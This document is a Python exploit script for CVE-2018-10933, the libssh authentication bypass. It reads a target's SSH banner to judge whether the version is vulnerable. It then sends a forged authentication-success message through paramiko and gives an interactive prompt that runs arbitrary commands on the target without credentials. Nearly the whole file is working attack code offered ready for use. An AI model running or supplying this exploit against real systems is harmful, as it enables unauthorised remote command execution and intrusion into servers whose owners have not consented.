#!/usr/bin/python3

import sys,getopt,socket
import paramiko
import socket

print ("\033[1;31;48m");
print (" __        __  __         ______    ______   __    __  ")
print ("|  \      |  \|  \       /      \  /      \ |  \  |  \\")
print ("| $$       \$$| $$____  |  $$$$$$\|  $$$$$$\| $$  | $$ ")
print ("| $$      |  \| $$    \ | $$___\$$| $$___\$$| $$__| $$ ")
print ("| $$      | $$| $$$$$$$\ \$$    \  \$$    \ | $$    $$ ")
print ("| $$      | $$| $$  | $$ _\$$$$$$\ _\$$$$$$\| $$$$$$$$ ")
print ("| $$_____ | $$| $$__/ $$|  \__| $$|  \__| $$| $$  | $$ ")
print ("| $$     \| $$| $$    $$ \$$    $$ \$$    $$| $$  | $$ ")
print (" \$$$$$$$$ \$$ \$$$$$$$   \$$$$$$   \$$$$$$  \$$   \$$ \n")
print("\033[3;37;40m")
print ("                     CVE-2018-10933 Remote Code Execution")

def main(argv):
   server = ''
   port = ''
   try:
      opts, args = getopt.getopt(argv,"hs:p:",["iserver=","iport="])
   except getopt.GetoptError:
      print ('usage: python3 ssh.py -s [SERVER] -p [PORT] -c [COMMAND]')
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print ('usage: python3 ssh.py -s [SERVER] -p [PORT] -c [COMMAND]')
         sys.exit()
      elif opt in ("-s", "--iserver"):
         server = arg
      elif opt in ("-p", "--iport"):
         port = arg
   if (not server or not port):
       print ("usage: python3 ssh.py -s [SERVER] -p [PORT]")
       sys.exit(1)
   print ("\n\033[93m[*] Connecting to the target "+server+":"+port)
   try:
       s = socket.create_connection((str(server), int(port)))
       s.settimeout(None)
       banner = s.recv(2048)
       banner = banner.split(b"\n")[0]
       print ("[?] Version: "+"\033[94m"+banner.decode())
   except socket.error as e:
    print ("\033[1;31;48m[!] Service not available or down")
    sys.exit(1)
   if banner:
      if b"libssh-0.6" in banner or b"libssh_0.6" in banner:
        print ("\033[1;32;48m[OK] Tests shows that your target seems vulnerable! \n[*]  Exploiting...")
      elif b"libssh-0.7" in banner or b"libssh_0.7" in banner: 
        if int(banner.split(b".")[-1]) >= 6:
          print ("\033[93m[!!] Tests shows that your target has been patched!")
          sys.exit(1)
        else:
          print ("\033[1;32;48m[OK] Tests shows that your target seems vulnerable! \n[*]  Exploiting...")
      elif b"libssh-0.8" in banner or b"libssh_0.8" in banner:
        if int(banner.split(b".")[-1]) >= 4: 
          print ("\033[93m[!!] Tests shows that your target has been patched!")
          sys.exit(1)
        else:
          print ("\033[1;32;48m[OK] Tests shows that your target seems vulnerable! \n[*]  Exploiting...")
      else:
        print ("\033[1;31;48m[!] Tests shows that your target version is unexploitable")
        sys.exit(1)
   else:
        print ("\033[1;31;48m[!] Cannot find LibSSH. It seems not present")
        sys.exit(1)
   try:
          while True:
              command = input("\033[0mCommand "+server+":> ")
              s = socket.socket()
              s.connect((str(server),int(port))) #SSH PORT AS THE SECOND OPTION BY DEFAULT 1377 OR 22
              m = paramiko.message.Message()
              t = paramiko.transport.Transport(s)
              t.start_client()
              m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
              t._send_message(m)
              c = t.open_session()
              c.exec_command(command)
              out = c.makefile("rb",4096)
              output = out.read()
              #out.close()
              print(output.decode())
   except paramiko.SSHException as e:
       print("\033[1;31;48m[!] Undefinied Exception writing it in errors.txt. Probably channel is closed or not PortForwarded. Exiting...")
       file = open("errors.txt","w")
       file.write(str(e))
       file.close()
       sys.exit(1)
   except socket.error:
       print("\033[1;31;48mUnable to connect. Try again later")
       sys.exit(1)
      
if __name__ == "__main__":
   main(sys.argv[1:])
